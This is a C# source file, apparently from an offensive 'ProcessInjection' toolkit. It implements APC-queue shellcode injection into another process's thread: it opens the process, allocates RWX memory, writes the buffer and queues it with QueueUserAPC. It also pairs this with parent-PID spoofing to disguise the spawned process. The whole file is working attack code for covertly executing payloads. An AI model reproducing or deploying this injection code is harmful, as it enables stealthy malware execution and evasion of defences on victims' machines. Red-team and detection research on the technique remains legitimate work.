using System;
using static ProcessInjection.Native.Win32API;
using static ProcessInjection.Native.Enum;
using static ProcessInjection.Native.Structs;
using static ProcessInjection.Utils.Utils;
using System.Runtime.InteropServices;
using ProcessInjection.Native;

namespace ProcessInjection.PInvoke
{
    public class APCQueue
    {

        public static void APCInject(int pid, int threadid, byte[] buf)
        {
            try
            {
                uint lpNumberOfBytesWritten = 0;
                PrintInfo($"[!] Obtaining the handle for the process id {pid}.");
                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
                PrintInfo($"[!] Handle {pHandle} opened for the process id {pid}.");
                PrintInfo($"[!] Allocating memory to inject the shellcode.");
                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                PrintInfo($"[!] Memory for injecting shellcode allocated at 0x{rMemAddress}.");
                PrintInfo($"[!] Writing the shellcode at the allocated memory location.");
                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                {
                    PrintInfo($"[!] Shellcode written in the process memory.");
                    IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)threadid);
                    PrintInfo($"[!] Add the thread {tHandle} to queue for execution when it enters an alertable state.");
                    IntPtr ptr = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);
                    PrintInfo($"[!] Resume the thread {tHandle}");
                    ResumeThread(tHandle);
                    PrintSuccess($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                }
                else
                {
                    PrintError($"[-] Failed to write the shellcode into the memory of the process id {pid}.");
                }
                bool hOpenProcessClose = CloseHandle(pHandle);
            }
            catch (Exception ex)
            {
                PrintError("[-] " + Marshal.GetExceptionCode());
                PrintError(ex.Message);
            }
        }

        public static void PPIDAPCInject(string binary, byte[] shellcode, int parentpid)
        {
            PPIDSpoofing Parent = new PPIDSpoofing();
            PROCESS_INFORMATION pinf = Parent.ParentSpoofing(parentpid, binary);
            APCInject(pinf.dwProcessId, pinf.dwThreadId, shellcode);
        }
    }
}
